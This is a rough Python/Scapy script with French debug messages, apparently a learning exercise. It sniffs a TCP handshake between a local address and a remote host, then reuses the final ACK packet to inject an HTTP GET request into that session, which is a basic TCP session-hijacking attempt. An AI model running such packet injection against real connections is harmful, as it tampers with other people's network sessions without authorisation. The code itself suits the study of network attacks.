#! /usr/bin/python3

from scapy.all import *

flagslist=[]
state="first"
result=[]

def mycounter(packet):
    print("Flags: ", flagslist)
    flag=str(packet[0][TCP].flags)
    print("This is the flag to check: \'",flag,"\'")
    print("This is the flagslist :",flagslist)
    if flag=='S':
        print("flag vaut bien S")
    else:
        print("flag ne vaut pas S, il vaut \'",flag,"\'")
        print("longueur de flag: ", len(flag))
        print("type de flag:",type(flag))
        
    if "S" in flagslist:
        print("S est dans flagslist")
    if "S" not in flagslist:
        print("S n'est pas dans flagslist")
    if flag=="S" and "S" not in flagslist:
        print("SYN PACKET received")

    elif flag=="SA" and "SA" not in flagslist:
        print("moving well .. SYN ACK received")
    elif flag == "A" and "A" not in flagslist:
        state="three way handshake completed"
        print("**** three way handshake completed" )
        result.append("OK")
        result.append(packet)
    else:
        print("that flag was not expected: ",flag)
    flagslist.append(packet[0][TCP].flags)
    return

print("lancons le sniffer")

syn=sniff(filter="tcp and host 192.168.1.19 and host 193.55.113.222", prn=mycounter, count=3)
# syn=sniff(filter="tcp and host 192.168.1.19 and tcp port 2400", prn=mycounter, count=3)
# print(syn.show())
# print(syn.summary())

print("fin du sniff")

if "OK" in result:
    print("-------------------\n")
    print("packet with last ack \n")
    result[1].show()

    hijack=result[1]
    text_to_send="GET / HTTP/1.0\n\n"
    hijack=hijack / Raw(load=text_to_send)
    hijack[TCP].flags="PA"
    hijack[IP].len=hijack[IP].len+len(text_to_send)
    hijack.show()
    serpkt, unans=srp(hijack,timeout=5)
    serpkt.show()
    print("serpkt",serpkt)
    print("unans", unans)
    serpkt, unans=srp(hijack,timeout=5)
    serpkt.show()
    print("serpkt",serpkt)
    print("unans", unans)

else:
    print(" pas OK ???")
    print(result)
    
print("fin du sniff")

    
""""

exit()



syn.summary()
syn.show()
print("source ip and source port", syn[0][IP].src, syn[0][TCP].sport)
syn=sniff(filter="tcp and host 192.168.1.19 and host 151.101.121.67",  count=1)
syn.summary()
syn.show()
syn=sniff(filter="tcp and host 192.168.1.19 and host 151.101.121.67",  count=1)
syn.summary()
syn.show()
syn=sniff(filter="tcp and host 192.168.1.19 and host 151.101.121.67",  count=1)
syn.summary()
syn.show()


print("**** fin du sniffer ****")
#print("compteur = ", total)

"""


print("FIN DU PROGRAMME")
